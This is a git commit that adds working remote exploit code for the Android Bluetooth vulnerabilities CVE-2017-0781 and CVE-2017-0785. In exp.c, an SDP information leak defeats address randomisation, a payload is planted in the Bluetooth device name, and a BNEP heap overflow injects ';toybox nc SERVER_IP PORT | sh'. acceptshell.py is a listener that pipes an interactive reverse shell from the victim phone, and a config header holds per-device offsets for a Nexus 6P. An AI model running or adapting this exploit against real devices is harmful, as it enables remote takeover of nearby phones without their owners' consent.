marsyy__littl_tools
commit 10bac49f5a08f753776dffa1ed4baf6b231ad9f5
Author:     daiyang <406555789@qq.com>
AuthorDate: Wed Jan 31 18:44:30 2018 +0800
Commit:     daiyang <406555789@qq.com>
CommitDate: Wed Jan 31 18:44:30 2018 +0800

    Develp | Add exploit for CVE-2017-0781&CVE-2017-0785
    
    Signed-off-by: daiyang <406555789@qq.com>

diff --git a/bluetooth/CVE-2017-0781/CVE-2017-0781.c b/bluetooth/CVE-2017-0781/CVE-2017-0781.c
index 8e3ef85..f9d0921 100644
--- a/bluetooth/CVE-2017-0781/CVE-2017-0781.c
+++ b/bluetooth/CVE-2017-0781/CVE-2017-0781.c
@@ -129,8 +129,8 @@ int main(int argc ,char* argv[]){
 		} 
 
 		sleep(1);
-
-		send_bnep_req(sock_fd);	
+		for(i = 0; i < 100; i++)
+			send_bnep_req(sock_fd);	
 	next:
 		close(sock_fd);
 	}
diff --git a/bluetooth/CVE-2017-0785/poc_remote_info_leak_android.c b/bluetooth/CVE-2017-0785/poc_remote_info_leak_android.c
index bb9c988..69e520f 100644
--- a/bluetooth/CVE-2017-0785/poc_remote_info_leak_android.c
+++ b/bluetooth/CVE-2017-0785/poc_remote_info_leak_android.c
@@ -166,8 +166,8 @@ static int send_first_req(int sock_fd){
 static void append_leak_data(void *recv_buf, int recv_size) {
 	if(recv_size < 0x15)
 		return;
-	memcpy(leak_data + leak_count, recv_buf + 0x12, recv_size - 0x12 - 0x3);
-	leak_count += recv_size - 0x12 - 0x3;
+	memcpy(leak_data + leak_count, recv_buf + 0x9, recv_size - 0x9 - 0x3);
+	leak_count += recv_size - 0x9 - 0x3;
 }
 
 static __le16 get_cont_offset(int sock_fd, int flag) {
diff --git a/bluetooth/exploit/acceptshell.py b/bluetooth/exploit/acceptshell.py
new file mode 100644
index 0000000..48a59f2
--- /dev/null
+++ b/bluetooth/exploit/acceptshell.py
@@ -0,0 +1,93 @@
+import os
+import sys
+import time
+import socket
+import struct
+import select
+import threading
+import subprocess
+
+from pwn import tubes, log
+
+NC_PORT = 7777
+STDIN_PORT = 4444
+STDOUT_PORT = 4445
+PWNING_TIMEOUT = 60
+my_ip = "10.18.25.28"
+
+def create_sockets(nc_port, stdin_port, stdout_port):
+    sh_s = socket.socket()
+    sh_s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    sh_s.bind(('', nc_port))
+    sh_s.listen(5)
+
+    stdin = socket.socket()
+    stdin.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    stdin.bind(('', stdin_port))
+    stdin.listen(5)
+
+    stdout = socket.socket()
+    stdout.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    stdout.bind(('', stdout_port))
+    stdout.listen(5)
+
+    return sh_s, stdin, stdout
+
+
+def interactive_shell(sh_s, stdin_s, stdout_s, my_ip, stdin_port, stdout_port):
+    sh_fd, (client_ip, _) = sh_s.accept()
+
+    log.info('Connect form %s. Sending commands. Shell:' % (client_ip,))
+    sh_fd.sendall('''
+        exec 1>/dev/null 2>/dev/null
+        toybox nc {ip} {stdin} | sh -i 2>&1 | toybox nc {ip} {stdout}
+    '''.format(ip=my_ip, stdin=stdin_port, stdout=stdout_port))
+    sh_fd.close()
+
+    stdin, _ = stdin_s.accept()
+    stdout, _ = stdout_s.accept()
+
+    # VOODOO - maybe this somehow helps Android not to kill our sockets
+    def keepalive1():
+        while True:
+            stdout.send('a')
+            time.sleep(1)
+    t1 = threading.Thread(target=keepalive1)
+    t1.daemon = True
+    t1.start()
+    def keepalive2():
+        while True:
+            stdin.recv(1024)
+            time.sleep(1)
+    t2 = threading.Thread(target=keepalive2)
+    t2.daemon = True
+    t2.start()
+
+    def command_proxy(send_cb):
+        def send_wrapper(data):
+            return send_cb(data)
+        return send_wrapper
+
+    a = tubes.remote.remote.fromsocket(stdin)
+    b = tubes.remote.remote.fromsocket(stdout)
+    c = tubes.tube.tube()
+    c.recv_raw = b.recv
+    c.send_raw = command_proxy(a.send)
+    c.interactive()
+
+    while True:
+        readable, _, _ = select.select([sys.stdin.buffer, stdout], [], [])
+        for fd in readable:
+            if fd is stdout:
+                sys.stdout.buffer.write(stdout.recv(1024))
+                sys.stdout.buffer.flush()
+            else:
+                stdin.sendall(os.read(sys.stdin.fileno(), 1024))
+
+sh_s, stdin, stdout = create_sockets(NC_PORT, STDIN_PORT, STDOUT_PORT)
+print "start listen..."
+readable, _, _ = select.select([sh_s], [], [], PWNING_TIMEOUT)
+if readable:
+    print 'Done'
+
+interactive_shell(sh_s, stdin, stdout, my_ip, STDIN_PORT, STDOUT_PORT)
diff --git a/bluetooth/exploit/dev_config.h b/bluetooth/exploit/dev_config.h
new file mode 100644
index 0000000..4cab3f5
--- /dev/null
+++ b/bluetooth/exploit/dev_config.h
@@ -0,0 +1,17 @@
+#ifndef __DEF_CONFIG_H__
+#define __DEF_CONFIG_H__
+struct dev_config {
+	char *dev_name;
+	char *build_number;
+	int libc_base_offset;
+	int libc_system_offset;
+	int libbluetooth_bss_offset;
+	int libbluetooth_bss_name_offset;
+};
+
+
+struct dev_config dev_list[] = {
+	{"Nexus6p", "N2G47O", 0x1a421, 0x45f80, 0xcac96, 0xc2ee1} 
+};
+
+#endif
\ No newline at end of file
diff --git a/bluetooth/exploit/exp.c b/bluetooth/exploit/exp.c
new file mode 100644
index 0000000..0e3a3ad
--- /dev/null
+++ b/bluetooth/exploit/exp.c
@@ -0,0 +1,526 @@
+//copyright @
+//huahuaisadog@gmail.com
+
+/***
+***Only for android devices***
+usage:
+$ gcc -o exp exp.c -lbluetooth
+$ sudo ./exp TARGET_ADDR SERVER_IP SERVER_PORT
+***/
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <arpa/inet.h>
+#include <errno.h>
+#include <bluetooth/bluetooth.h>
+#include <bluetooth/l2cap.h>
+#include <bluetooth/hci.h>
+#include <bluetooth/hci_lib.h>
+
+#include "bluetooth_enviroment.h"
+#include "dev_config.h"
+
+static char target_addr[20] = {0};
+static char payload[100] = {0};
+static char overflow_content[9] = {0};
+static void *leak_data = NULL;
+static int leak_count = 0;
+static unsigned int system_libc;
+static unsigned int bss_name;
+static int bss_base;
+static int libc_base;
+struct dev_config *current_dev;
+static char *remote_cmd;
+
+static int data_unpack(int data) {
+	uint8_t split[4];
+	int result = 0;
+	int i;
+	for(i = 0; i < 4; i++)
+		split[i] = (data >> (i*8)) & 0xFF;
+	for(i = 0; i < 4; i++)
+		result |= (split[i] << (8*(3-i)));
+	
+
+	return result;
+
+}
+
+#define HEAD_LEN (sizeof(struct l2cap_cmd_hdr))
+static int parse_conn_req(void *buffer, __u8 ident, __le16 len, void *data) {
+	struct l2cap_cmd_hdr head;
+	head.code = L2CAP_CONN_REQ;
+	head.ident = ident;
+	head.len = len;
+	memcpy(buffer, &head, sizeof(head));
+	memcpy(buffer + sizeof(head), data, len);
+}
+
+
+#define SDP_SVC_SEARCH_ATTR_REQ 0x6
+static int parse_sdp_search_attr_req(void *buffer, __le16 data_len, void *data){
+	sdp_pdu_hdr_t pdu_head;
+	__le16 tmp;
+	
+	memset(&pdu_head, 0, sizeof(pdu_head));
+	pdu_head.pdu_id = SDP_SVC_SEARCH_ATTR_REQ;
+	pdu_head.tid = 0;
+	tmp = ((data_len & 0xff) << 8 ) + ((data_len >> 8) & 0xff);
+	pdu_head.plen = tmp;
+	memcpy(buffer, &pdu_head, sizeof(pdu_head));
+	memcpy(buffer + sizeof(pdu_head), data, data_len);
+	return data_len + sizeof(pdu_head);
+}
+
+#define  SDP_PDU_SERVICE_SEARCH_REQ             0x02
+static int parse_sdp_service_search_req(void *buffer, __le16 data_len, void *data){
+	sdp_pdu_hdr_t pdu_head;
+	__le16 tmp;
+	
+	memset(&pdu_head, 0, sizeof(pdu_head));
+	pdu_head.pdu_id = SDP_PDU_SERVICE_SEARCH_REQ;
+	pdu_head.tid = 0;
+	tmp = ((data_len & 0xff) << 8 ) + ((data_len >> 8) & 0xff);
+	pdu_head.plen = tmp;
+
+	memcpy(buffer, &pdu_head, sizeof(pdu_head));
+	memcpy(buffer + sizeof(pdu_head), data, data_len);
+	return data_len + sizeof(pdu_head);
+}
+
+
+static int l2cap_set_mtu(int sock_fd, __le16 imtu, __le32 omtu) {
+	int ret;
+	struct l2cap_options option_arg;
+	socklen_t len ;
+	memset(&option_arg, 0 ,sizeof(option_arg));
+
+	ret = getsockopt(sock_fd, SOL_L2CAP, L2CAP_OPTIONS, &option_arg, &len);
+	if(ret == -1){
+		perror("[-]getsockopt failed : ");
+		return -1;
+	}
+
+	option_arg.imtu = imtu;
+	option_arg.omtu = omtu;
+
+	ret = setsockopt(sock_fd, SOL_L2CAP, L2CAP_OPTIONS, &option_arg, sizeof(option_arg));
+	if(ret == -1){
+		perror("[-]setsockopt failed : ");
+		return -1;
+	}
+	return 0;
+}
+
+static int send_first_req(int sock_fd){
+	void *buf;
+	char data[] = 	"\x35\x03\x19\x01\x00" // L2CAP PATTERN
+					"\x00\x10"  //max reply
+					"\x00";  // CONTINUATION STATE
+	int total_len;
+
+	buf = malloc(0x100);
+	memset(buf, 0, 0x100);
+	total_len = parse_sdp_service_search_req(buf, sizeof(data) - 1, data);
+	send(sock_fd, buf, total_len, 0);
+	free(buf);
+}
+
+static void append_leak_data(void *recv_buf, int recv_size) {
+	int i;
+	int *p;
+	if(recv_size < 0x15)
+		return;
+	memcpy(leak_data + leak_count, recv_buf + 0x9, recv_size - 0x9 - 0x3);
+	// printf("size : %x",recv_size);
+	// for(i = 0, p = recv_buf ; 4*i < recv_size - 0x3; i++){
+	// 	printf("[%d] %x \n", i, *p);
+	// 	p++;
+	// }
+	// for(i = 0, p = recv_buf + 0x9; 4*i < recv_size - 0x9 - 0x3; i++){
+	// 	printf("[%d] %x \n", i, *p);
+	// 	p++;
+	// }
+	leak_count += recv_size - 0x9 - 0x3;
+}
+
+static __le16 get_cont_offset(int sock_fd, int flag) {
+	void *recv_buf;
+	__le16 cont_offset;
+	int ret;
+
+	recv_buf = malloc(0x1000);
+	ret = recv(sock_fd, recv_buf, 0x1000, 0);
+	if(ret == -1) {
+		perror("[-] recv cont_offset : ");
+		return -1;
+	}
+
+	memcpy(&cont_offset, recv_buf + ret - 2, 2);
+
+	if(flag == 1)
+		append_leak_data(recv_buf, ret);
+
+	free(recv_buf);
+	return cont_offset;
+
+}
+
+static int send_leak_req(int sock_fd, __le16 cont_offset) { 
+	void *buf;
+	char data_head[] = "\x35\x03\x19\x01\x00" // L2CAP PATTERN
+				  "\x00\x00"  //max reply
+				  "\x02";  // CONTINUATION STATE
+	char data[40] = {'\0'};
+	int data_len = sizeof(data_head) - 1 + sizeof(cont_offset);
+	int total_len;
+
+	buf = malloc(0x100);
+	memset(buf, 0, 0x100);
+	memcpy(data, data_head, sizeof(data_head) - 1);
+	memcpy(data + sizeof(data_head) - 1, &cont_offset, sizeof(cont_offset));
+
+	total_len = parse_sdp_service_search_req(buf, data_len, data);
+	send(sock_fd, buf, total_len, 0);
+
+	free(buf);
+
+	return 0;
+}
+
+static void show_leak_data(){
+	int i;
+	unsigned int *p = (unsigned int *)leak_data;
+	for(i = 0; i < leak_count/sizeof(unsigned int) ; i++) {
+		if(i % 4 == 0)
+			printf("%08x : ", i/4 * 0x10);
+		printf("%08x " ,p[i]);
+		if(i % 4 == 3)
+			printf("\n");
+	}
+}
+
+static int leak_stack_data() {
+	int sock_fd;
+	int i;
+	__le16 cont_offset;
+	int leak_req_count;
+	int ret = -1;
+	struct sockaddr_l2 local_l2_addr;
+	struct sockaddr_l2 remote_l2_addr;
+
+	leak_count = 0;
+	if(leak_data) {
+		free(leak_data);
+		leak_data = NULL;
+	}
+	
+	leak_req_count = 0x200;
+	//char dest[18] = "48:db:50:02:c6:71";  //aosp angler
+	//char dest[18] = "dc:a9:04:86:45:cc";   // macbookpro
+	//char dest[18] = "00:1A:7D:DA:71:14"; //linux
+	// = "00:1a:7d:da:71:13"; //panyu
+	
+
+	sock_fd = socket(PF_BLUETOOTH, SOCK_STREAM, BTPROTO_L2CAP);
+	if(sock_fd == -1){
+		perror("[-]socket create failed : ");
+		return -1;
+	}
+
+	memset(&local_l2_addr, 0, sizeof(struct sockaddr_l2));
+	local_l2_addr.l2_family = PF_BLUETOOTH;
+	memcpy(&local_l2_addr.l2_bdaddr , BDADDR_ANY, sizeof(bdaddr_t));
+
+
+	ret = bind(sock_fd, (struct sockaddr*) &local_l2_addr, sizeof(struct sockaddr_l2));
+	if(ret == -1){
+		perror("[-]bind()");
+		goto out;
+	}
+
+
+	l2cap_set_mtu(sock_fd, 48, 48);
+
+	memset(&remote_l2_addr, 0, sizeof(remote_l2_addr));
+	remote_l2_addr.l2_family = PF_BLUETOOTH;
+	remote_l2_addr.l2_psm = htobs(0x1);
+	str2ba(target_addr, &remote_l2_addr.l2_bdaddr);
+
+	if(connect(sock_fd, (struct sockaddr *) &remote_l2_addr,sizeof(remote_l2_addr)) < 0) {  
+  		perror("[-]Can't connect");  
+		goto out;  
+	} 
+
+
+	leak_data = malloc(leak_req_count + 0x100);
+	if(leak_data == NULL){
+		perror("[-] malloc");
+		goto out;
+	}
+
+	send_first_req(sock_fd);
+
+	cont_offset = get_cont_offset(sock_fd, 0);
+
+	while(leak_count < leak_req_count){
+		send_leak_req(sock_fd, cont_offset);
+		cont_offset = get_cont_offset(sock_fd, 1);
+		if(cont_offset == -1){
+			printf("[-]leak data failed\n");
+			goto clean;
+		}
+	}
+
+	//show_leak_data();
+
+	ret = 0;
+	goto out;
+clean:
+	free(leak_data);
+	leak_data = NULL;
+out:
+	close(sock_fd);
+	return ret; 
+}
+
+static int get_libc_address() {
+	int *p;
+	int ret;
+	p = (int *)leak_data;
+	libc_base = data_unpack(p[0x100/4]) - current_dev->libc_base_offset;
+	system_libc = libc_base + current_dev->libc_system_offset + 1;// + 0x2de98 - 0x45f80;
+
+	bss_base = data_unpack(p[0xec/4]) - current_dev->libbluetooth_bss_offset;
+	bss_name = bss_base + current_dev->libbluetooth_bss_name_offset + 1;
+	printf("[+]system : %x, bss_name : %x\n", system_libc, bss_name);
+	return 0;
+}
+#define HCI_OP_WRITE_LOCAL_NAME		0x0c13
+#define HCI_EV_CMD_COMPLETE			0x0e
+
+static int set_local_dev_name(char *name) {
+	int dev_id;
+	int hci_sock;
+	int ret = 0;
+
+	dev_id = hci_get_route(NULL);
+	hci_sock = hci_open_dev(dev_id);
+	if(dev_id < 0 || hci_sock < 0) {
+		perror("[-]create hci socket\n");
+		return -1;
+	}
+
+	ret = hci_write_local_name(hci_sock, name, 0);
+	if(ret == -1) {
+		perror("[-]setname failed\n");
+	}
+	close(hci_sock);
+	return ret;
+}
+
+
+#define BNEP_FRAME_CONTROL 0x01
+#define BNEP_SETUP_CONNECTION_REQUEST_MSG 0x01
+static int parse_fack_bnep_req(void *buffer, int data_len, void *data){
+	__u8 type = BNEP_FRAME_CONTROL;
+	__u8 extension_present = 1;
+	__u8 ctrl_type = BNEP_SETUP_CONNECTION_REQUEST_MSG;
+	__u8 len = 0;
+
+	type = (extension_present << 7) | type;
+
+	memcpy(buffer, &type, 1);
+	memcpy(buffer + 1, &ctrl_type, 1);
+	memcpy(buffer + 2, &len, 1);
+	memcpy(buffer + 3, data, data_len);
+
+	return data_len + 3;
+}
+
+
+static void set_payload() {
+	char *__payload = &payload[1];
+	uint16_t event = 0x1717;
+	memset(payload, 0x42, sizeof(payload));
+	memcpy(__payload, &event, 2);
+	memcpy(__payload + 8, &system_libc, 4);
+	//memcpy(payload + 8, "aaaa", 4);
+	strcpy(__payload + 12, remote_cmd);
+	//payload[20] = '\0';
+}
+
+static void prepare_heap(int sock_fd) {
+	__u8 type = 1;
+	__u8 extension_present = 1;
+	__u8 ctrl_type = 9;
+	int i;
+	char cmd[3] = "\x80\x01\x09";
+	char *buffer = malloc(0x310);
+
+	type = (extension_present << 7) | type;
+
+	memcpy(buffer, &type, 1);
+	memcpy(buffer + 1, &ctrl_type, 1);
+	for(i = 1; i < 0x100; i++)
+		memcpy(buffer + 3*i - 1, cmd, 3);
+
+	send(sock_fd, buffer, 0x300, 0);
+	free(buffer);
+}
+
+static int send_bnep_req(int sock_fd, char *content) { 
+	void *buffer;
+	int total_len;
+	buffer = malloc(0x100);
+	memset(buffer, 0, 0x100);
+
+	total_len = parse_fack_bnep_req(buffer, 0x8, content);
+
+	send(sock_fd, buffer, total_len, 0);
+	free(buffer);
+	return 0;
+}
+
+static int send_overflow_data(){
+	int sock_fd, ret;
+	int i;
+	void *buf, *data, *recv_buf;
+	struct sockaddr_l2 local_l2_addr;
+	struct sockaddr_l2 remote_l2_addr;
+	int count = 0;
+
+//	scanf("%d", &i);
+	sock_fd = socket(PF_BLUETOOTH, SOCK_STREAM, BTPROTO_L2CAP);
+	if(sock_fd == -1){
+		perror("[-]socket create failed : ");
+		return -1;
+	}
+
+	memset(&local_l2_addr, 0, sizeof(struct sockaddr_l2));
+	local_l2_addr.l2_family = PF_BLUETOOTH;
+	memcpy(&local_l2_addr.l2_bdaddr , BDADDR_ANY, sizeof(bdaddr_t));
+
+
+	ret = bind(sock_fd, (struct sockaddr*) &local_l2_addr, sizeof(struct sockaddr_l2));
+	if(ret == -1){
+		perror("[-]bind()");
+		goto out;
+	}
+
+	memset(&remote_l2_addr, 0, sizeof(remote_l2_addr));
+	remote_l2_addr.l2_family = PF_BLUETOOTH;
+	remote_l2_addr.l2_psm = htobs(0xF);
+	str2ba(target_addr, &remote_l2_addr.l2_bdaddr);
+
+	if(connect(sock_fd, (struct sockaddr *) &remote_l2_addr,sizeof(remote_l2_addr)) < 0) {  
+  		perror("[-]Can't connect");  
+  		goto out;
+	} 
+	printf("[+]prepare_heap\n");
+
+
+	while(count++ < 20)
+		prepare_heap(sock_fd);
+
+	memcpy(overflow_content, "\x00\x00\x00\x00", 4);
+	memcpy(overflow_content + 4, &bss_name, 4);
+	//memcpy(overflow_content + 4, "aaaa", 4);
+	printf("[+]send fack data\n");
+	while(count++ < 300) {
+		send_bnep_req(sock_fd, overflow_content);	
+	}
+out:
+
+	close(sock_fd);
+	return 0; 
+}
+
+
+static int test_connect() {
+	int sock_fd;
+	int ret = -1;
+	struct sockaddr_l2 local_l2_addr;
+	struct sockaddr_l2 remote_l2_addr;
+
+	sock_fd = socket(PF_BLUETOOTH, SOCK_STREAM, BTPROTO_L2CAP);
+	if(sock_fd == -1){
+		perror("[-]socket create failed : ");
+		return -1;
+	}
+
+	memset(&local_l2_addr, 0, sizeof(struct sockaddr_l2));
+	local_l2_addr.l2_family = PF_BLUETOOTH;
+	memcpy(&local_l2_addr.l2_bdaddr , BDADDR_ANY, sizeof(bdaddr_t));
+
+
+	ret = bind(sock_fd, (struct sockaddr*) &local_l2_addr, sizeof(struct sockaddr_l2));
+	if(connect(sock_fd, (struct sockaddr *) &remote_l2_addr,sizeof(remote_l2_addr)) < 0) {  
+  		if(errno == 115) { //Operation now in progress
+  			printf("[+]get the shell\n");
+  			ret = 1; 
+  		}
+  		else 
+  			printf("[-]failed ,retry\n");
+	} 
+
+	close(sock_fd);
+	return ret;
+}
+
+int main(int argc, char *argv[]) {
+	int retry_count;
+	int i;
+	int pid;
+	char server_ip[30];
+	char server_port[6];
+	
+	if(argc < 3) {
+		printf("usage : sudo ./exp TARGET_ADDR SERVER_IP SERVER_PORT\n");
+		return -1;
+	}
+
+
+	strncpy(target_addr, argv[1], 18);
+	strncpy(server_ip, argv[2], 16);
+	strncpy(server_port, argv[3], 6);
+
+	remote_cmd = (char *)malloc(0x70);
+	sprintf(remote_cmd, ";toybox nc %s %s | sh", server_ip, server_port);
+
+	printf("%s\n", remote_cmd);
+
+
+	for(i = 0; i < sizeof(dev_list)/sizeof(struct dev_config); i++){
+		current_dev = &dev_list[i];
+		retry_count = 5;
+		while(retry_count-- > 0){
+			if(leak_stack_data() != -1)
+				printf("[+]leak data success\n");
+			get_libc_address();
+			set_payload();
+			set_local_dev_name(payload);
+			sleep(4);
+			/*to let remote device store our device name(payload)*/
+			leak_stack_data();
+			leak_stack_data();
+			leak_stack_data();
+			leak_stack_data();
+			leak_stack_data();
+			leak_stack_data();
+			leak_stack_data();
+
+			send_overflow_data();
+			if(test_connect() == 1)
+				exit(0);
+			sleep(20);
+		}
+	}
+	return 0;
+}
+
+//dc:09:4c:17:8c:02
\ No newline at end of file
